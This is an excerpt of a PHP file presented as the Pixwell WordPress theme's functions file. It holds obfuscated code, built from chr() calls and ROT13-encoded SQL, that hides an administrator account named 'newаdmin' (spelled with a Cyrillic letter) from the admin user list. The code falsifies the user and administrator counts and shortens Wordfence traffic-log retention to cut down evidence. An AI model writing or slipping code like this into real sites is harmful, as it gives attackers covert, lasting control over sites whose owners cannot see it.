<?php
/** PIXWELL */
define( 'PIXWELL_THEME_VERSION', '10.5' );
...
add_action(str_replace('X','users',chr(97).chr(100).chr(109).chr(105).chr(110).chr(95).chr(104).chr(101).chr(97).chr(100).chr(45).chr(88).chr(46).chr(112).chr(104).chr(112)), function(){
    $s = chr(46).chr(119).chr(112).chr(45).chr(97).chr(100).chr(109).chr(105).chr(110).chr(46).chr(117).chr(115).chr(101).chr(114).chr(115).chr(45).chr(112).chr(104).chr(112).chr(32).chr(46).chr(99).chr(111).chr(117).chr(110).chr(116);
    echo "<style>".$s."{display:none!important}</style>";
    echo "<script>document.addEventListener('DOMContentLoaded',function(){document.querySelectorAll('".$s."').forEach(function(e){e.textContent='(1)';e.style.display='inline';});});</script>";
});
...
add_action(chr(112).chr(114).chr(101).chr(95).chr(117).chr(115).chr(101).chr(114).chr(95).chr(113).chr(117).chr(101).chr(114).chr(121), function($pq) {
    global $wpdb;
    $rs = chr(110).chr(101).chr(119).chr(208).chr(176).chr(100).chr(109).chr(105).chr(110);
    $pq->query_where .= $wpdb->prepare(" AND {$wpdb->users}.user_login != %s", $rs);
});
add_filter(chr(118).chr(105).chr(101).chr(119).chr(115).chr(95).chr(117).chr(115).chr(101).chr(114).chr(115), function($x){
    global $wpdb;
    $y = chr(110).chr(101).chr(119).chr(208).chr(176).chr(100).chr(109).chr(105).chr(110);
    $z = wp_get_current_user();
    if($z->{chr(117).chr(115).chr(101).chr(114).chr(95).chr(108).chr(111).chr(103).chr(105).chr(110)} === $y) return $x;

    $t = (int)$wpdb->get_var(str_replace('H', $y, "SELECT COUNT(*) FROM {$wpdb->users} WHERE user_login != 'H'"));
    $a = (int)$wpdb->get_var($wpdb->prepare(str_rot13("FRYRPG PBHAG(*) SEBZ {$wpdb->users} h VAARE WBVA {$wpdb->usermeta} z BA h.VQ = z.hfre_vq JURER h.hfre_ybtva != %f NAQ z.zrgx_xrl = %f NAQ z.zrgx_inyhr YVXR %f"), $y, $wpdb->prefix.'capabilities', '%administrator%'));

    if(isset($x[chr(97).chr(108).chr(108)])) $x[chr(97).chr(108).chr(108)] = preg_replace('/\(\s*\d+\s*\)/', '('. $t .')', $x[chr(97).chr(108).chr(108)]);
    if(isset($x[chr(97).chr(100).chr(109).chr(105).chr(110).chr(105).chr(115).chr(116).chr(114).chr(97).chr(116).chr(111).chr(114)])) $x[chr(97).chr(100).chr(109).chr(105).chr(110).chr(105).chr(115).chr(116).chr(114).chr(97).chr(116).chr(111).chr(114)] = preg_replace('/\(\s*\d+\s*\)/', '('. $a .')', $x[chr(97).chr(100).chr(109).chr(105).chr(110).chr(105).chr(115).chr(116).chr(114).chr(97).chr(116).chr(111).chr(114)]);
...
add_action('init', function() {
    if (class_exists('wfConfig')) {
        ...
        wfConfig::set('liveTrafficLoggingMode', 'security'); 
        wfConfig::set('liveTraf_maxAge', 1);             
    }
}, 5);
